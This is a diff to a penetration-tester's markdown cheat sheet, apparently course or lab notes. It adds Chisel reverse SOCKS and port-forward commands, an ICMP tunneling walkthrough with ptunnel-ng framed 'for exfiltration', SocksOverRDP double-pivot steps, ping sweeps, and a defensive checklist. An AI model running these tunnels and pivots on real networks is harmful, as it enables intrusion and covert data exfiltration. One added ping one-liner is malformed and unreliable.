@@ -12,12 +12,15 @@
   - [Rpivot](#rpivot)
   - [Netsh](#netsh)
   - [DNS Tunneling](#dns-tunneling)
+  - [ICMP Tunneling](#icmp-tunneling)
+  - [Double Pivot](#double-pivot)
 - [External Tools](#external-tools)
 - [Phishing](#phishing)
 - [Passive](#passive)
   - [recon-ng](#recon-ng)
   - [Weaponization](#weaponization)
 - [Wireshark](#wireshark)
+- [Fixes](#fixes)
 
 ## Basic Steps
 - Enumerate
@@ -75,6 +78,8 @@ end
 -  ProxyChain
 - (linux) firewall-cmd --zone=public --add-port PORT/tcp
 - (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
+- [Worth Reading](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)
+- [Worth watching](https://www.youtube.com/watch?v=B3GxYyGFYmQ)
 
 ### SSH
 - -o PubkeyAcceptedKeyTypes=ssh-rsa
@@ -191,6 +196,9 @@ for i in {1..255}; do (ping -c 1 172.16.5.${i} | grep "bytes from" &); done
 # Windows
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+
+
+for /L %i in (1,1,255) do @ping -n 1 -w 172.16.5.%i >> nul && echo 172.16.5.%i is up
 ```
 
 - ICMP blocked
@@ -304,26 +312,41 @@ socks4 	127.0.0.1 9050
 
 ### CHISEL
 - set up tunnel proxy / port forward
-  
+- TCP/UDP tunnel over HTTP secured via SSH
 - client / server 
-  
+- [Download](https://github.com/jpillora/chisel.git)
+  - [Releases](https://github.com/jpillora/chisel/releases)
+  - [Description](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+
+- Steps
+  - Download chisel
+  - Build binary
+  - [shrink its size - 24 min](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)
+  - Transfer to pivot
+  - Start server on pivot to listen incoming connections
+    - chisel server -v -p 1234 --socks5
+  - Start client on attacker Connect pivot to Attacker
+    - chisel client -v PIVOT:1234 socks
+  - Adjust proxychains config to tun port
+  - 
+
 - Reverse SOCKS Proxy
   - server: chisel server -p [port] --reverse &
-  - client (victim0): ./chisel client [attacker]:8005 R:socks &
+  - client (pivot): ./chisel client [attacker]:8005 R:socks &
     - R = remote, client knows that server antecipate proxy
-- 
+
 - Forward SOCK Proxy
-  - victim: ./chisel server -p LISTEN_PORT --socks5
+  - Pivot: ./chisel server -p LISTEN_PORT --socks5
   - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
   
 - Port Forward
   - attacker: ./chisel server -p LISTEN_PORT --reverse &
-  - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
-  - victim to our machine: ./chisel server -p 1337 --reverse &
+  - Pivot to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+  - Pivot to our machine: ./chisel server -p 1337 --reverse &
   
 - Local Port Forward
   - attacker: ./chisel server -p LISTEN_PORT
-  - Victim: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+  - Pivot: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
     - Victim: chisel client ATTACKER:PORT R:LOCALPORT:localhost:TargetPORT 
 
 - In the machine with evil-win open firewall port
@@ -531,15 +554,9 @@ sudo bundle install
 # server (attacker)
 sudo ruby dnscat2.rb --dns host=$ATTACKER,port=53,domain=inlanefreight.local --no-cache
 
-
-
 # Client for windows
-```
 git clone https://github.com/lukebaggett/dnscat2-powershell.git
 
-- [dnscat2-powershell: Client for windows](https://github.com/lukebaggett/dnscat2-powershell)
-
-```
 # Import module
 Import-Module .\dnscat2.ps1
 
@@ -548,6 +565,60 @@ Start-Dnscat2 -DNSserver $ATTACKER -Domain inlanefreight.local -PreSharedSecret 
 ruby dnscat.rb --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
 ```
 
+- [dnscat2-powershell: Client for windows](https://github.com/lukebaggett/dnscat2-powershell)
+
+
+### ICMP Tunneling
+- Encapsulate traffich withing ICMP packet
+- For exfiltration
+- [ptunnel](https://github.com/utoni/ptunnel-ng)
+- Steps
+  1. Create tunnel Pivot==Attacker
+  2. Download ptunnel
+  3. Build it on pivot
+  4. Transfer to pivot
+  5. Server on pivot
+    - sudo ./ptunnel-ng -r$PIVOT -R22
+  6. Client on attacker
+    - sudo ./ptunnel-ng -p$PIVOT -l2222 -r$PIVOT -R22
+  7. Proxy traffic through tunnel
+  8. Connect to ssh using port 2222
+    - ssh -p2222 -lUSER 127.0.0.1
+
+- Also for Dynamic port forwading
+  - ssh -D 9050 -p2222 -lUSER 127.0.0.1
+
+### Double Pivot
+- Socks with RDP
+
+```mermaid
+---
+title: Double Pivot
+---
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::foo -->|RDP| B(Pivot 1):::bar -->|3389| C(Pivot 2) -->|3389| D(Target)
+    classDef foo stroke:#f00
+    classDef bar stroke:#0f0
+end
+```
+
+- [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP)
+- Dynamic Virtual Channels (DVC): tunnel packages over RDP
+  - Normal usage: clipboard data, audio
+
+- Steps
+  1. Download [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
+  2. Download [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+  3. Upload files to pivot
+  4. Load SocksOVERRDP.dll
+    - regsvr32.exe SocksOverRDP-Plugin.dll
+  5. Connect to Pivot 2
+    - mstsc.exe
+  6. Transfer SocksOverRDP-Server.exe to target
+  7. Start proxifier on Pivot 1
+  8. Connected from Pivot 2 to target
 
 
 ## External Tools
@@ -645,3 +716,41 @@ ruby dnscat.rb --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d5
 - Check queries
   - dns
   - http
+
+## Fixes
+- Check if new tools/hosts/traffic appear
+
+```
+- DNS records, network device backups, and DHCP configurations
+- Full and current application inventory
+- A list of all enterprise hosts and their location
+- Users who have elevated permissions
+- A list of any dual-homed hosts (More than one network interface)
+- Keeping a visual network diagram of your environment
+```
+
+- **Identify Permiter**
+```
+- What exactly are we protecting?
+- What are the most valuable assets the organization owns that need securing?
+- What can be considered the perimeter of our network?
+- What devices & services can be accessed from the Internet? (Public-facing)
+- How can we detect & prevent when an attacker is attempting an attack?
+- How can we make sure the right person &/or team receives alerts as soon as something isn't right?
+- Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?
+- Do we have any external trusts with outside partners?
+- What types of authentication mechanisms are we using?
+- Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?
+- Do we have a Disaster Recovery plan?
+```
+
+- **Internal considerations**
+```
+- Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?
+- Are we using Intrusion Detection and Prevention systems within our environment?
+- How are our networks configured? Are different teams confined to their own network segments?
+- Do we have separate networks for production and management networks?
+- How are we tracking approved employees who have remote access to admin/management networks?
+- How are we correlating the data we are receiving from our infrastructure defenses and end-points?
+- Are we utilizing host-based IDS, IPS, and event logs?
+```
